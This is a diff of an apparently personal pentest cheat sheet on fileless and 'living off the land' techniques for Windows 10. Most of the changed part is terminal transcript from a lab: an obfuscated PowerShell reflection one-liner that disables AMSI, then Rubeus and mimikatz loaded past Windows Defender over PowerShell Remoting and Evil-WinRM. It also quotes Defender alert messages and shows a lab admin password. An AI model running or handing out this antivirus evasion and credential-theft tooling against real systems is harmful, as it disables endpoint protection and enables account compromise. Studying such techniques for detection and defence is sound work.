@@ -1,6 +1,6 @@
-========================================================================================================================
+===================================================================================================================================
 Living off the land and filess techniques
-========================================================================================================================
+===================================================================================================================================
 
 ---------------------------------------------------------------
 Why using 'living off the land and fileless' techniques ?
@@ -67,13 +67,13 @@ Windows Security features
   Note: Microsoft has introduced Credential Guard in Windows 10 Enterprise and Windows Server 2016, which uses virtualization-based security to isolate secrets,
   and it is effective in preventing Mimikatz from retrieving hashes directly from memory.
 
-==========================================================================================================================
+===================================================================================================================================
 Example - AMSI bypass techniques 
-==========================================================================================================================
+===================================================================================================================================
 
---------------------------------------------------------------------------------------------------------------------------
-Example 1 - AMSI bypass with a low privileged user logged on a Windows 10 laptop with Defender (AV) enabled and up-to-date
---------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------------
+Example 1 - AMSI bypass with a low privileged user locally logged on a Windows 10 laptop with Defender (AV) enabled and up-to-date
+-----------------------------------------------------------------------------------------------------------------------------------
 
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
@@ -152,21 +152,33 @@ PS C:\temp>
 Example 2 - AMSI bypass with a local admin user remotely logged on a Window 10 Laptop with Defender (AV) enabled and up-to-date
 ---------------------------------------------------------------------------------------------------------------------------------
 
-Test with Powershell Remoting
-------------------------------
+2.1 Test with Powershell Remoting
+----------------------------------
+
 PS C:\> Enter-PSSession -Computername server02.Security-Test-Lab.Local -Credential server02\administrator
+[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> 
+
+=> Note: Without disabling the AMSI, the script 'Invoke-Rubeus.ps1' is detected and blocked by Windows Defender...
+
+[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> . .\Invoke-Rubeus.ps1
+At C:\Users\Administrator.PO718687\Documents\Tools-AD\Invoke-Rubeus.ps1:1 char:1
++ function Invoke-Rubeus([string]$Command)
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [], ParseException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+
+=> Note: Let's disable it.
+
 [server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> 
 [server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> $Hxl=$null;
 [server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> $xqhoooo="$([cHAr](83*54/54)+[CHAR]([bYTe]0x79)+[chaR]([BytE]0x73)+[cHAR]([ByTE]0x74)+[chAR]([BYte]0x65)+[chAr]([BYTE]0x6d)).$(('Mänäg'+'ement').NORmAlize([ChAr](13+57)+[cHAr]([BytE]0x6f)+[CHAR](40+74)+[cHaR](92+17)+[CHAr](68+27-27)) -replace [ChAr]([BYte]0x5c)+[CHar](112)+[chAR]([byte]0x7b)+[chAr](77*64/64)+[ChaR](110)+[char](125*63/63)).$(('Autóm'+'âtíon').nOrmALIZE([char]([BYtE]0x46)+[CHAr]([BYtE]0x6f)+[ChaR](114+1-1)+[ChaR]([ByTe]0x6d)+[chaR](68)) -replace [cHar]([ByTE]0x5c)+[cHAR]([bYTe]0x70)+[cHAR]([byTe]0x7b)+[cHAR]([byte]0x4d)+[CHar](110+94-94)+[cHAR]([BYtE]0x7d)).$([chAR]([bYTE]0x41)+[CHAR]([byTE]0x6d)+[ChAR]([ByTE]0x73)+[chaR](105+6-6)+[ChaR](85+23-23)+[cHAR](116*86/86)+[cHar](105)+[cHar]([BYtE]0x6c)+[cHAr](115))";
-[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents>
 [server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> $wpkfsoadsfehqpe="+[cHAR]([bytE]0x72)+[ChAr](121)+[chAR]([bYtE]0x79)+[cHar](97+3)+[cHar](121+41-41)+[cHAr]([bYte]0x6f)+[cHar]([BYTe]0x66)+[chAr](107+87-87)+[chAr]([BYTE]0x69)";
 [server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> [Threading.Thread]::Sleep(286);
 [server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> [Ref].Assembly.GetType($xqhoooo).GetField($([char](71+26)+[char]([BYtE]0x6d)+[CHar]([byte]0x73)+[chaR](105+75-75)+[CHar]([ByTe]0x49)+[chAr]([bytE]0x6e)+[CHar](37+68)+[cHAr](116+2-2)+[Char](70+37-37)+[char](97)+[chAR]([BYTE]0x69)+[chaR](93+15)+[CHAr]([byte]0x65)+[char](100)),"NonPublic,Static").SetValue($Hxl,$true);
 [server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents>
-[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> cd .\Documents\
-[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> cd .\Tools-AD\
-[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents\Tools-AD>  . .\Invoke-Rubeus.ps1
-[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents\Tools-AD>  Invoke-Rubeus
+[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents>  . .\Invoke-Rubeus.ps1
+[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents>  Invoke-Rubeus
    ______        _
   (_____ \      | |
    _____) )_   _| |__  _____ _   _  ___
@@ -177,8 +189,10 @@ PS C:\> Enter-PSSession -Computername server02.Security-Test-Lab.Local -Credenti
   v1.6.4
 <SNIP>
 
+=> It is working.
 
-Test with Evil-WinRM
+
+2.2 Test with Evil-WinRM
 ----------------------------
 
 ┌──(kali㉿kali)-[~/Documents]
@@ -203,7 +217,7 @@ At line:1 char:1
 [+] menu
 [+] exit
 
-=> Note: Without disbaling the AMSI, mimikatz is detected and blocked by Windiws Defender...
+=> Note: Without disabling the AMSI, 'mimikatz.exe' and 'Invoke-Mimkatz.ps1' are detected and blocked by Windows Defender...
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Binary /home/kali/Documents/x64/mimikatz.exe
 At line:1 char:1
@@ -224,7 +238,7 @@ This script contains malicious content and has been blocked by your antivirus so
     + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
 
 
-=> Note: Let's try the AMSI bypass feature of Evil-Winrm...
+=> Note: Let's try the AMSI bypass feature of Evil-WinRM...
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents> Bypass-4MSI
 [+] Success!
@@ -238,8 +252,31 @@ Error: Exiting with code 1
 
 => Note: The "Bypass-4MSI" feature is not working. It is detected by Windows Defender and the WinRM connection is shutdown.
 
+Windows Defender messages
+=========================
 
-Let's try to disable it manually vi the Evil-WinRM shell...
+HackTool:Win32/Mikatz!dha
+Alert level: High
+Status: Active
+Date: 23/11/2021 01:32
+Category: Tool
+Details: This program has potentially unwanted behaviour
+Learn more
+Affected items:
+	amsi: \Device\HarddiskVolume3\Windows\System32\wsmprovhost.exe
+	
+Trojan:PowerShell/PSAttackTool.A
+Alert level: Severe
+Status: Active
+Date: 23/11/2021 01:35
+Category: Trojan
+Details: This program is dangerous and executes commands from an attacker.
+Learn more
+Affected items:
+	amsi: \Device\HarddiskVolume3\Windows\System32\wsmprovhost.exe
+
+
+=> Let's try to disable it manually via the Evil-WinRM shell...
 
 ┌──(kali㉿kali)-[~/Documents/x64]
 └─$ evil-winrm -u administrator -p 'Totoro42!' -i 192.168.1.35 -e '/home/kali/Documents/x64/' -s '/home/kali/Documents/'                                                                              1 ⨯
